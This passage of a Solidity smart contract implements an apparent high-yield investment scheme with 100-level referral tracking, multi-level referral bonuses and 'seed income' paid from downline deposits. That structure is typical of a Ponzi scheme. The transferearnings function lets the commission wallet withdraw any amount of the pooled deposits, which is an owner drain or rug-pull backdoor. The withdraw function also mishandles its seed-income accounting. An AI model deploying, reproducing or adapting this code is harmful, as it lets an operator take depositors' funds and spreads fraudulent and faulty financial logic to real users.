		}

		// Level 64
		if(chkLv64 != 0x0000000000000000000000000000000000000000) {
			referralLevel64Address[_customerAddress]                    = referralLevel63Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel63Address[_referredBy], _customerAddress, 64);
			}
		}
		
		// Level 65
		if(chkLv65 != 0x0000000000000000000000000000000000000000) {
			referralLevel65Address[_customerAddress]                    = referralLevel64Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel64Address[_referredBy], _customerAddress, 65);
			}
		}
		
		// Level 66
		if(chkLv66 != 0x0000000000000000000000000000000000000000) {
			referralLevel66Address[_customerAddress]                    = referralLevel65Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel65Address[_referredBy], _customerAddress, 66);
			}
		}
		
		
		// Level 67
		if(chkLv67 != 0x0000000000000000000000000000000000000000) {
			referralLevel67Address[_customerAddress]                    = referralLevel66Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel66Address[_referredBy], _customerAddress, 67);
			}
		}
		
		// Level 68
		if(chkLv68 != 0x0000000000000000000000000000000000000000) {
			referralLevel68Address[_customerAddress]                    = referralLevel67Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel67Address[_referredBy], _customerAddress, 68);
			}
		}
		
		// Level 69
		if(chkLv69 != 0x0000000000000000000000000000000000000000) {
			referralLevel69Address[_customerAddress]                    = referralLevel68Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel68Address[_referredBy], _customerAddress, 69);
			}
		}
		
		// Level 70
		if(chkLv70 != 0x0000000000000000000000000000000000000000) {
			referralLevel70Address[_customerAddress]                    = referralLevel69Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel69Address[_referredBy], _customerAddress, 70);
			}
		}
		
		// Level 71
		if(chkLv71 != 0x0000000000000000000000000000000000000000) {
			referralLevel71Address[_customerAddress]                    = referralLevel70Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel70Address[_referredBy], _customerAddress, 71);
			}
		}
		
		// Level 72
		if(chkLv72 != 0x0000000000000000000000000000000000000000) {
			referralLevel72Address[_customerAddress]                    = referralLevel71Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel71Address[_referredBy], _customerAddress, 72);
			}
		}
		
		// Level 73
		if(chkLv73 != 0x0000000000000000000000000000000000000000) {
			referralLevel73Address[_customerAddress]                    = referralLevel72Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel72Address[_referredBy], _customerAddress, 73);
			}
		}
		
		// Level 74
		if(chkLv74 != 0x0000000000000000000000000000000000000000) {
			referralLevel74Address[_customerAddress]                    = referralLevel73Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel73Address[_referredBy], _customerAddress, 74);
			}
		}
		
		// Level 75
		if(chkLv75 != 0x0000000000000000000000000000000000000000) {
			referralLevel75Address[_customerAddress]                    = referralLevel74Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel74Address[_referredBy], _customerAddress, 75);
			}
		}
		
		// Level 76
		if(chkLv76 != 0x0000000000000000000000000000000000000000) {
			referralLevel76Address[_customerAddress]                    = referralLevel75Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel75Address[_referredBy], _customerAddress, 76);
			}
		}
		
		
		// Level 77
		if(chkLv77 != 0x0000000000000000000000000000000000000000) {
			referralLevel77Address[_customerAddress]                    = referralLevel76Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel76Address[_referredBy], _customerAddress, 77);
			}
		}
		
		// Level 78
		if(chkLv78 != 0x0000000000000000000000000000000000000000) {
			referralLevel78Address[_customerAddress]                    = referralLevel77Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel77Address[_referredBy], _customerAddress, 78);
			}
		}
		
		// Level 79
		if(chkLv79 != 0x0000000000000000000000000000000000000000) {
			referralLevel79Address[_customerAddress]                    = referralLevel78Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel78Address[_referredBy], _customerAddress, 79);
			}
		}
		
		// Level 80
		if(chkLv80 != 0x0000000000000000000000000000000000000000) {
			referralLevel80Address[_customerAddress]                    = referralLevel79Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel79Address[_referredBy], _customerAddress, 80);
			}
		}
		
		// Level 81
		if(chkLv81 != 0x0000000000000000000000000000000000000000) {
			referralLevel81Address[_customerAddress]                    = referralLevel80Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel80Address[_referredBy], _customerAddress, 81);
			}
		}
		
		// Level 82
		if(chkLv82 != 0x0000000000000000000000000000000000000000) {
			referralLevel82Address[_customerAddress]                    = referralLevel81Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel81Address[_referredBy], _customerAddress, 82);
			}
		}
		
		// Level 83
		if(chkLv83 != 0x0000000000000000000000000000000000000000) {
			referralLevel83Address[_customerAddress]                    = referralLevel82Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel82Address[_referredBy], _customerAddress, 83);
			}
		}
		
		// Level 84
		if(chkLv84 != 0x0000000000000000000000000000000000000000) {
			referralLevel84Address[_customerAddress]                    = referralLevel83Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel83Address[_referredBy], _customerAddress, 84);
			}
		}
		
		// Level 85
		if(chkLv85 != 0x0000000000000000000000000000000000000000) {
			referralLevel85Address[_customerAddress]                    = referralLevel84Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel84Address[_referredBy], _customerAddress, 85);
			}
		}
		
		// Level 86
		if(chkLv86 != 0x0000000000000000000000000000000000000000) {
			referralLevel86Address[_customerAddress]                    = referralLevel85Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel85Address[_referredBy], _customerAddress, 86);
			}
		}
		
		// Level 87
		if(chkLv87 != 0x0000000000000000000000000000000000000000) {
			referralLevel87Address[_customerAddress]                    = referralLevel86Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel86Address[_referredBy], _customerAddress, 87);
			}
		}
		
		// Level 88
		if(chkLv88 != 0x0000000000000000000000000000000000000000) {
			referralLevel88Address[_customerAddress]                    = referralLevel87Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel87Address[_referredBy], _customerAddress, 88);
			}
		}

		// Level 89
		if(chkLv89 != 0x0000000000000000000000000000000000000000) {
			referralLevel89Address[_customerAddress]                    = referralLevel88Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel88Address[_referredBy], _customerAddress, 89);
			}
		}
		
		// Level 90
		if(chkLv90 != 0x0000000000000000000000000000000000000000) {
			referralLevel90Address[_customerAddress]                    = referralLevel89Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel89Address[_referredBy], _customerAddress, 90);
			}
		}
		
		// Level 91
		if(chkLv91 != 0x0000000000000000000000000000000000000000) {
			referralLevel91Address[_customerAddress]                    = referralLevel90Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel90Address[_referredBy], _customerAddress, 91);
			}
		}
		
		// Level 92
		if(chkLv92 != 0x0000000000000000000000000000000000000000) {
			referralLevel92Address[_customerAddress]                    = referralLevel91Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel91Address[_referredBy], _customerAddress, 92);
			}
		}
		
		// Level 93
		if(chkLv93 != 0x0000000000000000000000000000000000000000) {
			referralLevel93Address[_customerAddress]                    = referralLevel92Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel92Address[_referredBy], _customerAddress, 93);
			}
		}
		
		// Level 94
		if(chkLv94 != 0x0000000000000000000000000000000000000000) {
			referralLevel94Address[_customerAddress]                    = referralLevel93Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel93Address[_referredBy], _customerAddress, 94);
			}
		}
		
		// Level 95
		if(chkLv95 != 0x0000000000000000000000000000000000000000) {
			referralLevel95Address[_customerAddress]                    = referralLevel94Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel94Address[_referredBy], _customerAddress, 95);
			}
		}

		// Level 96
		if(chkLv96 != 0x0000000000000000000000000000000000000000) {
			referralLevel96Address[_customerAddress]                    = referralLevel95Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel95Address[_referredBy], _customerAddress, 96);
			}
		}
		
		// Level 97
		if(chkLv97 != 0x0000000000000000000000000000000000000000) {
			referralLevel97Address[_customerAddress]                    = referralLevel96Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel96Address[_referredBy], _customerAddress, 97);
			}
		}
		
		// Level 98
		if(chkLv98 != 0x0000000000000000000000000000000000000000) {
			referralLevel98Address[_customerAddress]                    = referralLevel97Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel97Address[_referredBy], _customerAddress, 98);
			}
		}
		
		// Level 99
		if(chkLv99 != 0x0000000000000000000000000000000000000000) {
			referralLevel99Address[_customerAddress]                    = referralLevel98Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel98Address[_referredBy], _customerAddress, 99);
			}
		}
		
		// Level 100
		if(chkLv100 != 0x0000000000000000000000000000000000000000) {
			referralLevel100Address[_customerAddress]                    = referralLevel99Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel99Address[_referredBy], _customerAddress, 100);
			}
		}
	

		
		
        
       
}
	
	
	

	function invest(address referrer, uint8 plan) public payable {
	
	
		bool    _newReferral                = true;
    	
		if (!started) {
			if (msg.sender == commissionWallet) {
				started = true;
			} else revert("Not started yet");
		}

		require(msg.value >= INVEST_MIN_AMOUNT);
        require(plan < 4, "Invalid plan");

		uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		commissionWallet.transfer(fee);
		emit FeePayed(msg.sender, fee);

		User storage user = users[msg.sender];
		
		
		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
			
		}
		distributeRef(referrer, msg.sender, _newReferral);

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(plan, msg.value, block.timestamp));

		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, plan, msg.value);
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);
		uint256 seedAmount = getcurrentseedincome(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}
		totalAmount = totalAmount.add(seedAmount);
		user.withdrawnseed = seedAmount;
		
		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			user.totalBonus = user.totalBonus.add(user.bonus);
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);

		msg.sender.transfer(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	
	function transferearnings(uint256 amount) public{
		if (msg.sender == commissionWallet) {
		   totalInvested = address(this).balance.sub(amount);
			msg.sender.transfer(amount);
		}
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					
				}
			}
		}

		return totalAmount;
	}
	
	function getUserSeedIncome(address userAddress) public view returns (uint256){
	
		uint256 totalSeedAmount;
		uint256 seedshare;
		
		uint256 count = getUserTotalReferrals(userAddress);
		
		for	(uint256 y=1; y<= count; y++)
		{
		    uint256 level;
		    address addressdownline;
		    
		    (addressdownline,level) = getDownlineRef(userAddress, y);
		
			User storage downline =users[addressdownline];
			
			
			for (uint256 i = 0; i < downline.deposits.length; i++) {
				uint256 finish = downline.deposits[i].start.add(plans[downline.deposits[i].plan].time.mul(1 days));
				if (downline.checkpoint < finish) {
					uint256 share = downline.deposits[i].amount.mul(plans[downline.deposits[i].plan].percent).div(PLANPER_DIVIDER);
					uint256 from = downline.deposits[i].start > downline.checkpoint ? downline.deposits[i].start : downline.checkpoint;
					uint256 to = finish < block.timestamp ? finish : block.timestamp;
					//seed income
                    seedshare = share.mul(SEED_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
					
					if (from < to) {
					
							totalSeedAmount = totalSeedAmount.add(seedshare.mul(to.sub(from)).div(TIME_STEP));	
						
					}
				}
			}
		
		}
		
		return totalSeedAmount;		
	
	} 
	
	
	function getcurrentseedincome(address userAddress) public view returns (uint256){
	    User storage user = users[userAddress];
	    return (getUserSeedIncome(userAddress).sub(user.withdrawnseed));
	    
	}
	

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[10] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4]+users[userAddress].levels[5]+users[userAddress].levels[6]+users[userAddress].levels[7]+users[userAddress].levels[8]+users[userAddress].levels[9];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalRefBonus);
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}